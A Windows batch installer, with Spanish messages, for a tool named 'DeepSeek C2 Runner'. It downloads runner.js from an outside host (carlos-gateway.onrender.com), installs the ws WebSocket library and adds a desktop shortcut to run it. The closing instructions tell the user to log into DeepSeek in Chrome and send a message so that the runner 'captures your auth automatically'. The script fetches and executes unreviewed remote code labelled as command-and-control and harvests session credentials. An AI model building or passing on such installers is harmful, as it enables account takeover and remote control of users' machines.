@echo off
title DeepSeek C2 Runner Setup
color 0F

echo.
echo ========================================
echo   DeepSeek C2 Runner - Setup
echo ========================================
echo.

REM Verificar que Node.js esta instalado
echo [1/4] Verificando Node.js...
node --version >nul 2>&1
if errorlevel 1 (
    color 0C
    echo.
    echo ERROR: Node.js no esta instalado
    echo Descargalo de https://nodejs.org/
    echo.
    pause
    exit /b 1
)
for /f "tokens=*" %%i in ('node --version') do set NODE_VER=%%i
echo       Node.js %NODE_VER% encontrado
echo.

REM Crear carpeta
if not exist "%USERPROFILE%\DeepSeek-Runner" (
    echo [2/4] Creando carpeta...
    mkdir "%USERPROFILE%\DeepSeek-Runner"
) else (
    echo [2/4] Carpeta ya existe
)
cd /d "%USERPROFILE%\DeepSeek-Runner"
echo       OK
echo.

REM Descargar runner.js
echo [3/4] Descargando runner.js...
curl -sL -o runner.js "https://carlos-gateway.onrender.com/install.js" 2>&1
if errorlevel 1 (
    echo       Intentando con PowerShell...
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://carlos-gateway.onrender.com/install.js' -OutFile 'runner.js'" 2>&1
)
if not exist runner.js (
    color 0C
    echo.
    echo ERROR: No se pudo descargar runner.js
    echo Verifica tu conexion y la VPN
    echo.
    pause
    exit /b 1
)
echo       OK
echo.

REM Crear package.json si no existe
if not exist package.json (
    echo [3/4] Inicializando npm...
    npm init -y 2>&1
    echo       OK
) else (
    echo [3/4] package.json ya existe
)
echo.

REM Instalar dependencias
echo [4/4] Instalando dependencias (1-2 min)...
echo       Solo se instala ws (sin playwright)
echo.
call npm install ws 2>&1
echo.
if errorlevel 1 (
    color 0C
    echo.
    echo ERROR: Fallo npm install
    echo.
    echo Solucion manual:
    echo   1. Abri una ventana CMD
echo   2. Ejecuta:
echo      cd "%USERPROFILE%\DeepSeek-Runner"
echo      npm install ws
    echo.
    pause
    exit /b 1
)
echo       OK
echo.

REM Verificar que todo esta bien
if not exist "node_modules\ws" (
    color 0C
    echo.
    echo ERROR: ws no se instalo correctamente
    echo.
    pause
    exit /b 1
)

REM Crear acceso directo en el escritorio
echo Creando acceso directo en el escritorio...
powershell -Command "try { $nodePath = (Get-Command node).Source; $ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut([System.IO.Path]::Combine($env:USERPROFILE, 'Desktop', 'DeepSeek Runner.lnk')); $s.TargetPath = $nodePath; $s.Arguments = ([System.IO.Path]::Combine($env:USERPROFILE, 'DeepSeek-Runner', 'runner.js')); $s.WorkingDirectory = [System.IO.Path]::Combine($env:USERPROFILE, 'DeepSeek-Runner'); $s.Description = 'DeepSeek C2 Runner'; $s.Save(); Write-Host 'OK' } catch { Write-Host ('Error: ' + $_.Exception.Message) }" 2>&1
echo.

echo ========================================
echo   INSTALADO CORRECTAMENTE
echo ========================================
echo.
echo Para usar:
echo   1. Doble-click en "DeepSeek Runner" en tu escritorio
echo   2. O abri CMD y ejecuta:
echo      cd "%USERPROFILE%\DeepSeek-Runner"
echo      node runner.js start
echo.
echo Primer uso:
echo   - Se abre Chrome con DeepSeek
echo   - Logueate
echo   - Envia UN mensaje (ej: "hola")
echo   - El runner captura tu auth automaticamente
echo.
pause